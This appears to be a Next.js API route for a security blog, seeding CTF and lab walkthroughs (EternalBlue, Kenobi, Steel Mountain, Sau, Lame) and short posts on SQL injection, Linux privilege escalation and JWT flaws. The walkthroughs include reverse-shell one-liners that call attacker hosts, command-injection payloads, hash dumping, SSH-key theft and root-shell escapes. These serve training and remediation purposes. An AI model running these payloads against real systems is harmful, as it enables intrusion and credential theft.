import { NextResponse } from "next/server";
import { getCollectionData, saveCollectionData } from "@/lib/db";

export const defaultBlogs = [
  // --- TryHackMe Writeups ---
  {
    slug: "thm-blue-eternalblue",
    title: "TryHackMe: Blue (EternalBlue / MS17-010 Walkthrough)",
    category: "TryHackMe",
    platform: "TryHackMe",
    difficulty: "Easy",
    date: "Oct 2024",
    readTime: "6 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# TryHackMe: Blue (EternalBlue MS17-010 Walkthrough)

A complete practical walkthrough of the **Blue** machine on TryHackMe, demonstrating reconnaissance, vulnerability scanning, and exploitation of the infamous MS17-010 (EternalBlue) SMB flaw.

---

## 1. Nmap Reconnaissance
We begin by conducting an aggressive Nmap scan with vulnerability scripts enabled against the target machine:

\`\`\`bash
nmap -sV -sC -p- -T4 --script vuln 10.10.x.x
\`\`\`

The scan identifies open SMB ports (139/445) and explicitly confirms:
\`\`\`text
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
\`\`\`

---

## 2. Exploitation via Metasploit
We load the exploit module in \`msfconsole\`:

\`\`\`bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set LHOST tun0
run
\`\`\`

Within seconds, a Meterpreter shell is spawned running with **NT AUTHORITY\\SYSTEM** privileges.

---

## 3. Post Exploitation & Flag Retrieval
\`\`\`bash
meterpreter > hashdump
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
\`\`\`
`
  },
  {
    slug: "thm-kenobi-samba-suid",
    title: "TryHackMe: Kenobi (Samba Exploitation & SUID Path Hijacking)",
    category: "TryHackMe",
    platform: "TryHackMe",
    difficulty: "Easy",
    date: "Sep 2024",
    readTime: "8 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# TryHackMe: Kenobi (Samba & SUID Path Hijacking)

Walkthrough covering anonymous SMB share enumeration, ProFTPD 1.3.5 \`mod_copy\` exploit, and escalating privileges using an unquoted SUID binary path hijacking.

---

## 1. SMB & ProFTPD Enumeration
\`\`\`bash
smbclient -L //10.10.x.x/ -N
\`\`\`
We locate an open anonymous share containing a user log file mentioning ProFTPD version 1.3.5.

Using \`mod_copy\`, we copy Kenobi's private SSH key to the mounted NFS share:
\`\`\`bash
nc 10.10.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
\`\`\`

---

## 2. Privilege Escalation via SUID Path Manipulation
Inspecting SUID binaries:
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`
We observe a custom binary \`/usr/bin/menu\` running strings command without absolute path (\`curl\`).

\`\`\`bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
\`\`\`
Selecting the curl option spawns a root shell!
`
  },
  {
    slug: "thm-steel-mountain",
    title: "TryHackMe: Steel Mountain (Rejetto HTTP Server & Unquoted Service Paths)",
    category: "TryHackMe",
    platform: "TryHackMe",
    difficulty: "Medium",
    date: "Aug 2024",
    readTime: "9 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# TryHackMe: Steel Mountain Walkthrough

Steel Mountain demonstrates exploiting Rejetto HTTP File Server 2.3 followed by local Windows privilege escalation using PowerUp and unquoted service path abuse.

---

## 1. Initial Access: Rejetto HFS CVE-2014-6287
An initial port scan reveals Rejetto HTTP File Server running on port 8080. Using the Python RCE exploit:

\`\`\`bash
python3 exploit.py 10.10.x.x 8080 "nc.exe -e cmd.exe <attacker-ip> 4444"
\`\`\`

---

## 2. Privilege Escalation: Unquoted Service Paths
Running PowerUp.ps1:
\`\`\`powershell
powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"
\`\`\`
We find the **AdvancedSystemCareService9** service with an unquoted executable path:
\`C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\`

By placing a malicious binary at \`C:\\Program Files (x86)\\IObit\\Advanced.exe\` and restarting the service, our payload executes as LocalSystem.
`
  },
  {
    slug: "thm-buffer-overflow-prep",
    title: "TryHackMe: Buffer Overflow Prep (OSCP Stack Smashing & Shellcode)",
    category: "TryHackMe",
    platform: "TryHackMe",
    difficulty: "Hard",
    date: "Jul 2024",
    readTime: "12 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# TryHackMe: Buffer Overflow Prep Walkthrough

A structured guide to x86 32-bit stack-based buffer overflow exploitation: fuzzing, finding the offset, controlling EIP, bad character analysis, finding a JMP ESP instruction, and generating shellcode.

---

## 1. Fuzzing & Crash Reproduction
\`\`\`python
import socket

buffer = b"OVERFLOW1 " + b"A" * 2000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.x.x", 1337))
s.send(buffer)
s.close()
\`\`\`

---

## 2. Finding the Exact EIP Offset
Using \`msf-pattern_create\`:
\`\`\`bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
\`\`\`
After the crash in Immunity Debugger:
\`\`\`text
!mona findmsp -distance 2400
\`\`\`
EIP offset located at exactly 1978 bytes.
`
  },

  // --- Hack The Box (HTB) Writeups ---
  {
    slug: "htb-sau-ssrf-maltrail",
    title: "Hack The Box: Sau (SSRF via Requests-Baskets to Maltrail v0.54 RCE)",
    category: "Hack The Box",
    platform: "Hack The Box",
    difficulty: "Easy",
    date: "Sep 2024",
    readTime: "7 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Hack The Box: Sau Walkthrough

Sau features a vulnerable instance of Requests-Baskets v1.2.1 exploited via SSRF to access an internal Maltrail service vulnerable to OS Command Injection (CVE-2023-27163).

---

## 1. SSRF via Requests-Baskets (CVE-2023-27163)
We configure a proxy basket redirecting internal traffic to \`http://127.0.0.1:80/login\`.

This exposes the Maltrail OS monitoring web interface.

---

## 2. Maltrail OS Command Injection
Maltrail v0.54 contains an unauthenticated OS command injection in the username parameter:

\`\`\`bash
curl 'http://10.10.11.224:55555/proxy-basket' --data 'username=;\`id | nc 10.10.14.x 4444\`'
\`\`\`
A reverse shell connects back as user \`puma\`.

---

## 3. Root via systemctl Sudo Misconfiguration
Running \`sudo -l\`:
\`(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service\`

We exploit the pager execution inside systemctl:
\`\`\`bash
sudo /usr/bin/systemctl status trail.service
# Type !sh in the pager to drop into root shell!
\`\`\`
`
  },
  {
    slug: "htb-lame-samba-rce",
    title: "Hack The Box: Lame (Classic Samba usermap script CVE-2007-2447)",
    category: "Hack The Box",
    platform: "Hack The Box",
    difficulty: "Easy",
    date: "Aug 2024",
    readTime: "5 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Hack The Box: Lame Walkthrough

A retrospective on the classic Lame machine on Hack The Box, exploiting Samba 3.0.20 \`usermap script\` command execution.

---

## 1. Nmap Scan
\`\`\`bash
nmap -sV -sC -p21,22,139,445 10.10.10.3
\`\`\`
Samba version identified: **Samba 3.0.20-Debian**.

---

## 2. Exploitation
The \`username map script\` option in \`smb.conf\` executes arbitrary shell commands:

\`\`\`bash
logon "/=\`nohup nc -e /bin/sh 10.10.14.x 4444\`"
\`\`\`
Result: Instant root shell on target!
`
  },
  {
    slug: "htb-topology-latex-injection",
    title: "Hack The Box: Topology (LaTeX Math Injection to Hash Extraction & Root)",
    category: "Hack The Box",
    platform: "Hack The Box",
    difficulty: "Easy",
    date: "Jun 2024",
    readTime: "8 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Hack The Box: Topology Walkthrough

Topology features an academic LaTeX rendering engine exploited to read internal files via \`\\input\`, followed by cron job gnuplot script hijacking for root.

---

## 1. Arbitrary File Read via LaTeX Injection
On the math generator page:
\`\`\`latex
$\\lstinputlisting{/var/www/dev/.htpasswd}$
\`\`\`
We extract the Apache htpasswd hash and crack it with \`john\`.
`
  },

  // --- CTF Writeups ---
  {
    slug: "picoctf-binary-exploitation",
    title: "PicoCTF: Binary Exploitation & Format String Vulnerability Walkthrough",
    category: "CTF Writeups",
    platform: "CTF",
    difficulty: "Medium",
    date: "May 2024",
    readTime: "7 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# PicoCTF: Format String Vulnerability Walkthrough

A deep dive into format string exploitation (\`%x\`, \`%p\`, \`%s\`, \`%n\`) to leak memory addresses and overwrite arbitrary pointers in ELF binaries.

---

## 1. Analyzing the Vulnerable Binary
\`\`\`c
int main() {
    char buf[128];
    fgets(buf, 128, stdin);
    printf(buf); // Vulnerable: missing format specifier
}
\`\`\`
`
  },
  {
    slug: "cyber-apocalypse-web-challenge",
    title: "Cyber Apocalypse CTF: Web Challenge SQLi & WAF Bypass",
    category: "CTF Writeups",
    platform: "CTF",
    difficulty: "Medium",
    date: "Apr 2024",
    readTime: "8 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Cyber Apocalypse CTF: Web Exploitation Walkthrough

Walkthrough of custom regex filter bypasses and nested JSON SQL injection payloads during Hack The Box Cyber Apocalypse CTF.
`
  },
  {
    slug: "knightctf-network-forensics",
    title: "KnightCTF: Network Forensics, PCAP Decryption & Packet Carving",
    category: "CTF Writeups",
    platform: "CTF",
    difficulty: "Medium",
    date: "Mar 2024",
    readTime: "6 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# KnightCTF: Network Forensics & PCAP Analysis

Extracting exfiltrated credentials from TLS streams using Wireshark, TShark, and keylog files.
`
  },

  // --- Technical & Security Research ---
  {
    slug: "sql-injection-modern-web-apps",
    title: "Deep Dive into Modern SQL Injection and Defense Mechanisms",
    category: "Security Research",
    platform: "Research",
    difficulty: "Advanced",
    date: "Oct 2024",
    readTime: "7 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Deep Dive into Modern SQL Injection and Defense Mechanisms

SQL Injection (SQLi) remains one of the most persistent and critical security flaws in web applications. Despite parameterized queries being well-known, modern microservices and complex dynamic report builders frequently introduce vulnerable injection surfaces.

![Security Architecture & Threat Vectors](/china-mountains.jpg)

---

## 1. Vulnerability Fundamentals
SQL Injection occurs when user-supplied input is directly concatenated or unsafely formatted into an active database query without proper validation or parameter binding:

\`\`\`sql
-- Vulnerable dynamic query pattern
SELECT id, username, email FROM accounts 
WHERE username = 'admin' AND password = '' OR '1'='1';
\`\`\`

When this input is executed by the database engine, the logical condition \`'1'='1'\` always evaluates to \`TRUE\`, effectively bypassing authentication checks entirely.

---

## 2. Advanced Attack Vectors

### A. Second-Order SQL Injection
In second-order attacks, the malicious payload is stored in the database first (e.g., during profile registration) and later executed unsafely in a different administrative workflow:

\`\`\`python
# Attacker registers with a crafted username
malicious_user = "admin'--"

# Later, an administrative reporting job triggers the stored value unsafely:
cursor.execute(f"UPDATE login_logs SET status = 'active' WHERE username = '{malicious_user}'")
\`\`\`

### B. Time-Based Blind Extraction
When an application returns identical HTTP status codes and suppresses error messages, attackers use database sleep functions to extract data character by character:

\`\`\`sql
-- PostgreSQL time delay payload for data extraction
SELECT CASE WHEN (SELECT substring(password, 1, 1) FROM users WHERE username='admin')='a' 
       THEN pg_sleep(5) 
       ELSE pg_sleep(0) END;
\`\`\`

---

## 3. Defense & Remediation Matrix

Never trust user-supplied input. Always utilize parameterized queries and prepared statements:

| Mitigation Strategy | Effectiveness | Implementation Details |
|---|---|---|
| **Prepared Statements (Parameterized)** | 100% against injection | Database compiles SQL template first, treating inputs strictly as literal values. |
| **Object-Relational Mapping (ORM)** | High | Use built-in ORM abstractions (Prisma, Hibernate, SQLAlchemy) safely. |
| **Input Sanitization & Allowlisting** | Defense in Depth | Enforce strict regex validation on user identifiers. |

\`\`\`javascript
// Secure parameterized implementation using PostgreSQL in Node.js
const query = 'SELECT id, email, role FROM accounts WHERE id = $1';
const values = [userId];
const result = await pool.query(query, values);
\`\`\`

### Summary
SQL Injection is completely preventable by avoiding raw string concatenation in queries and enforcing prepared statements at every data tier.
`
  },
  {
    slug: "linux-privilege-escalation-techniques",
    title: "Essential Linux Privilege Escalation Techniques for CTF & Pentesting",
    category: "Security Research",
    platform: "Research",
    difficulty: "Intermediate",
    date: "Sep 2024",
    readTime: "10 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Essential Linux Privilege Escalation Techniques for CTF & Pentesting

Gaining an initial foothold via a reverse shell is only the first step. Privilege escalation (PrivEsc) is the methodology used to elevate from low-privileged user access to \`root\`.

![Terminal and Offensive Security Tools](/profile.jpg)

---

## 1. Initial Reconnaissance & Enumeration
Before running automated scripts, execute basic manual enumeration commands to understand system privileges:

\`\`\`bash
# Check current user and groups
id
whoami

# List sudo privileges without requiring password
sudo -l

# Check Linux kernel and distribution release
uname -a
cat /etc/os-release
\`\`\`

---

## 2. Abusing SUID / SGID Binaries
Files with the SUID (Set User ID) bit set execute with the file owner's permissions, typically \`root\`.

To discover all SUID binaries across the filesystem:
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`

Look out for uncommon or custom binaries or GTFOBins staples such as \`vim\`, \`nmap\`, \`bash\`, or \`find\`:

\`\`\`bash
# Example: Escaping through SUID find
find . -exec /bin/sh -p \\; -quit
\`\`\`

---

## 3. Vulnerable Sudo Permissions (GTFOBins)
If \`sudo -l\` reveals permissions like \`(root) NOPASSWD: /usr/bin/python3\`, you can immediately spawn a root shell:

\`\`\`bash
sudo python3 -c 'import os; os.system("/bin/bash")'
\`\`\`

Always check [GTFOBins](https://gtfobins.github.io) for verified bypasses against binary binaries.
`
  },
  {
    slug: "api-security-jwt-vulnerabilities",
    title: "Breaking and Securing JSON Web Tokens (JWT) in REST APIs",
    category: "Security Research",
    platform: "Research",
    difficulty: "Intermediate",
    date: "Aug 2024",
    readTime: "6 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# Breaking and Securing JSON Web Tokens (JWT) in REST APIs

JSON Web Tokens (JWT) are widely adopted for stateless authentication in modern web APIs. However, improper signature verification and algorithmic confusion often introduce severe authentication bypasses.

---

## 1. JWT Structure Breakdown
A standard JSON Web Token consists of three base64url-encoded parts separated by periods:
1. **Header**: Contains token type and signing algorithm (\`{"alg": "HS256", "typ": "JWT"}\`)
2. **Payload**: Contains session claims and user metadata (\`{"sub": "1234", "role": "user"}\`)
3. **Signature**: Cryptographic proof guaranteeing integrity

---

## 2. Classic Flaws & Exploits

### A. The "None" Algorithm Flaw
Some outdated libraries accept tokens signed with \`"alg": "none"\`, completely ignoring signature verification:

\`\`\`python
# Header payload with none algorithm
{
  "alg": "none",
  "typ": "JWT"
}
\`\`\`
By stripping the signature and changing \`"role": "admin"\`, an attacker can gain unauthorized administrative privileges.

### B. Weak HMAC Secrets
When tokens are signed using \`HS256\` with short or dictionary secrets, tools like \`hashcat\` or \`jwt-tool\` can brute-force the secret key offline in minutes:

\`\`\`bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
\`\`\`

---

## 3. Remediation Checklist
- Always enforce explicit algorithm whitelisting on the verification server.
- Use strong, asymmetric keys (\`RS256\` or \`EdDSA\`) with at least 2048-bit length.
- Never rely on the client-specified \`alg\` header to determine the verification logic.
`
  },
  {
    slug: "recon-methodology-bug-bounty",
    title: "My Reconnaissance Methodology for Bug Bounty Hunting",
    category: "Security Research",
    platform: "Research",
    difficulty: "Intermediate",
    date: "Jul 2024",
    readTime: "8 min read",
    author: "MD Leon Islam",
    github: "https://github.com/OxL3on",
    medium: "https://medium.com/@OxL3on",
    content: `# My Reconnaissance Methodology for Bug Bounty Hunting

In bug bounty programs with wide scopes (\`*.target.com\`), quality reconnaissance accounts for over 80% of finding novel bugs before other hunters.

---

## 1. Asset Discovery Pipeline

1. **Subdomain Enumeration**:
   - Passive sources: Certificate Transparency logs (crt.sh), VirusTotal, SecurityTrails.
   - Active brute-forcing with \`shuffledns\` or \`massdns\`.

2. **Port Probing & Service Discovery**:
   \`\`\`bash
   # Probe alive HTTP/HTTPS services
   cat subdomains.txt | httpx -silent -title -status-code -tech-detect
   \`\`\`

3. **JavaScript Endpoint Analysis**:
   - Extract hidden API routes and token leaks using \`katana\` and \`gau\`.
`
  }
];

export async function GET(req) {
  try {
    const { searchParams } = new URL(req.url);
    const slug = searchParams.get('slug');

    const blogs = await getCollectionData("blogs", defaultBlogs);

    if (slug) {
      const item = blogs.find(b => b.slug === slug);
      return NextResponse.json(item || blogs[0] || defaultBlogs[0]);
    }

    return NextResponse.json(blogs.length > 0 ? blogs : defaultBlogs);
  } catch (e) {
    return NextResponse.json(defaultBlogs);
  }
}

export async function POST(req) {
  try {
    const body = await req.json();
    const current = await getCollectionData("blogs", defaultBlogs);

    let updatedList = [];
    if (Array.isArray(body)) {
      updatedList = body;
    } else {
      const newItem = {
        id: body.id || `blog-${Date.now()}`,
        ...body,
        createdAt: new Date()
      };
      updatedList = [newItem, ...current];
    }

    await saveCollectionData("blogs", updatedList);
    return NextResponse.json({ success: true, result: updatedList });
  } catch (e) {
    console.error("POST Blogs API Error:", e);
    return NextResponse.json({ error: "Failed to update blogs", details: e.message }, { status: 500 });
  }
}

export async function PUT(req) {
  try {
    const body = await req.json();
    const current = await getCollectionData("blogs", defaultBlogs);
    const index = current.findIndex(b => b.slug === body.slug || b.id === body.id);

    if (index >= 0) {
      current[index] = { ...current[index], ...body, updatedAt: new Date() };
    } else {
      current.push({ ...body, id: body.id || `blog-${Date.now()}` });
    }

    await saveCollectionData("blogs", current);
    return NextResponse.json({ success: true, result: current });
  } catch (e) {
    return NextResponse.json({ error: "Failed to update blog" }, { status: 500 });
  }
}

export async function DELETE(req) {
  try {
    const { searchParams } = new URL(req.url);
    const slug = searchParams.get('slug');
    const id = searchParams.get('id');
    const current = await getCollectionData("blogs", defaultBlogs);

    const filtered = current.filter(b => b.slug !== slug && b.id !== id);
    await saveCollectionData("blogs", filtered);
    return NextResponse.json({ success: true, result: filtered });
  } catch (e) {
    return NextResponse.json({ error: "Failed to delete blog" }, { status: 500 });
  }
}
